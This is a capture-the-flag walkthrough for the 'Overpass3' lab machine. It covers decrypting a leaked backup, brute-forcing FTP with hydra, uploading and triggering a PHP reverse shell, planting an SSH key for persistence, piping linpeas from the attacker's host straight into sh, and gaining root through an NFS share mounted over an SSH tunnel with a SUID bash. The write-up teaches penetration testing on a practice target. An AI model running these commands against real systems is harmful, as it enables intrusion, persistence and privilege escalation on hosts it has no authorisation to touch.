Overpass3 Writeup


# Enumeration

First we start a nmap scan and a gobuster scan as always and start exploring manually the webpage.

The Webpage itself looks a bit empty and static but we find a few possible Usernames:

[![https://imgur.com/OQ86bnA.png](https://imgur.com/OQ86bnA.png)](https://imgur.com/OQ86bnA.png)

We also found a /backups endpoint through our gobusterscan.

Visiting that page http://ip/backups give us the option to download the backup.zip

[![https://imgur.com/jPMhQKN.png](https://imgur.com/jPMhQKN.png)](https://imgur.com/jPMhQKN.png)

After downloading and unzipping the file we get two new files:

[![https://imgur.com/0vbx7Ob.png](https://imgur.com/0vbx7Ob.png)](https://imgur.com/0vbx7Ob.png)

one of them is a PGP(Pretty Good Privacy) Key and the other one is a protected excel file which we need to open with our PGP key.

After researching abit i found that we can import the key with gpg:

gpg --import priv.key

and then use it to open the file:

gpg CustomerDetails.xlsx.gpg

now after renaming CustomerDetails.xlsx to CustomerDetails we have a folder with files we can search through.

One of the files is called sharedStrings.xml where we find a list of Credentials.

But where do we login? We didn't find any login through gobuster so lets check the services we found on nmap.

[![https://imgur.com/tN09AUl.png](https://imgur.com/tN09AUl.png)](https://imgur.com/tN09AUl.png)

We have an ssh and an FTP service.

I created short wordlists out of the credentials we found to automate trying to loginto the services and now we can use hydra to give us a hand for executing the login.

The command for hydra is the following:

[![https://imgur.com/7m8lubp.png](https://imgur.com/7m8lubp.png)](https://imgur.com/7m8lubp.png)

(If you want to replace the ip like in the image above you can: sudo vim /etc/hosts and a line: ip overpass3)

We can already see that SSH wont work with out a private rsa key.

So lets try ftp.

Success!

[![https://imgur.com/DzdnfOz.png](https://imgur.com/DzdnfOz.png)](https://imgur.com/DzdnfOz.png)

We can now loginto FTP!

[![https://imgur.com/GZzNLB5.png](https://imgur.com/GZzNLB5.png)](https://imgur.com/GZzNLB5.png)

After testing that we can upload files:

[![https://imgur.com/1uxQlRt.png](https://imgur.com/1uxQlRt.png)](https://imgur.com/1uxQlRt.png)

We can now create a folder upload our reverseshell and then call the endpoint where the file is stored to activate the reverseshell.
(Get a reverseshell on https://github.com/pentestmonkey/php-reverse-shell and dont forget to change the ip and port)

[![https://imgur.com/s2NQwJR.png](https://imgur.com/s2NQwJR.png)](https://imgur.com/s2NQwJR.png)

We also need to start a nc listener:

sudo nc -lvnp port

To activate the shell we can curl the place where its stored:

curl http://overpass3/shell/phprev.php

And we are in! 

[![https://imgur.com/F2x8fh9.png](https://imgur.com/F2x8fh9.png)](https://imgur.com/F2x8fh9.png)

## Persistence

If we navigate to the /home directory we can see that there are two users:
James and Paradox.
For Paradox we know the password so lets switch to that user:

[![https://imgur.com/4SCpOba.png](https://imgur.com/4SCpOba.png)](https://imgur.com/4SCpOba.png)

In his homedirectory (~) we can see a .ssh folder so lets put our public key in authorizedkeys to get a better shell and persistance.

[![https://imgur.com/Tgsi0S5.png](https://imgur.com/Tgsi0S5.png)](https://imgur.com/Tgsi0S5.png)

Now we can use our private id_rsa key to loginto SSH:

[![https://imgur.com/l7yN2dj.png](https://imgur.com/l7yN2dj.png)](https://imgur.com/l7yN2dj.png)


## Privilege Escalation

Lets find out what we can execute and how we can escalate our privileges.

First we create a simple http.server on our hostmachine:

python3 -m http.server

i already have linpeas if you need to downloaded it do it here: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

and on the target machine go into the /tmp directory:

curl http://your_THM_IP/linpeas.sh | sh

we found a option root_squash for nfs so we could try to ssh tunnel into that service.

[![https://imgur.com/364hbdt.png](https://imgur.com/364hbdt.png)](https://imgur.com/364hbdt.png)

We are logged into ssh as paradox and we want to get access to the james user.

[![https://imgur.com/vjgiKIG.png](https://imgur.com/vjgiKIG.png)](https://imgur.com/vjgiKIG.png)

We see that the folder of james is shared /home/james.

So we can mount it as paradox and then access the content, right?

No, :( because we ain't root.

So we need a way to mount as root.. Where do we have root access? On our own machine! 

So we find the port that the service is running on, normally we would do that with netstat but since its not available we run rpcinfo.

[![https://imgur.com/yQwrJH0.png](https://imgur.com/yQwrJH0.png)](https://imgur.com/yQwrJH0.png)

We can see on which port nfs is running: 2049.

Now since we have access to paradox with ssh we can PORTFORWARD.

ssh paradox@10.10.185.59 -i paradox -L 2049:localhost:2049

[![https://imgur.com/WJ5ae58.png](https://imgur.com/WJ5ae58.png)](https://imgur.com/WJ5ae58.png)

that means we can send our mount command from our host machine ( where we cant access the port 2049 of the target because its locally ) through the ssh port 22 where we have access to and then locally we can access again the port 2049 and since we have root privileges on our host we can mount the folder.

[![https://imgur.com/zk99jhr.png](https://imgur.com/zk99jhr.png)](https://imgur.com/zk99jhr.png)

We successfully mounted through an SSH-Tunnel :) 

Lets see what we find in the share.

A user flag! 

[![https://imgur.com/jU8g4fA.png](https://imgur.com/jU8g4fA.png)](https://imgur.com/jU8g4fA.png)

And ssh credentials from james !

[![https://imgur.com/0uV8IsI.png](https://imgur.com/0uV8IsI.png)](https://imgur.com/0uV8IsI.png)

Lets loginto his account with ssh.

[![https://imgur.com/ZayPFoa.png](https://imgur.com/ZayPFoa.png)](https://imgur.com/ZayPFoa.png)

Now we can copy a binary, give it SUID privileges from our HOST since we are root there.

So we can cp /bin/bash .
The shared directory as James.

[![https://imgur.com/tpqioux.png](https://imgur.com/tpqioux.png)](https://imgur.com/tpqioux.png)

And then we can execute it with the flag -p so the set permission is not reset.

[![https://imgur.com/gzXSQgw.png](https://imgur.com/gzXSQgw.png)](https://imgur.com/gzXSQgw.png)

Give it root privilege.

[![https://imgur.com/Jn8FPH7.png](https://imgur.com/Jn8FPH7.png)](https://imgur.com/Jn8FPH7.png)

Execute it.

[![https://imgur.com/wSQ3NVf.png](https://imgur.com/wSQ3NVf.png)](https://imgur.com/wSQ3NVf.png)

We made it! 

[![Celebration](https://media.giphy.com/media/3FQ1YRBV0TnTi6eG4g/giphy.gif)

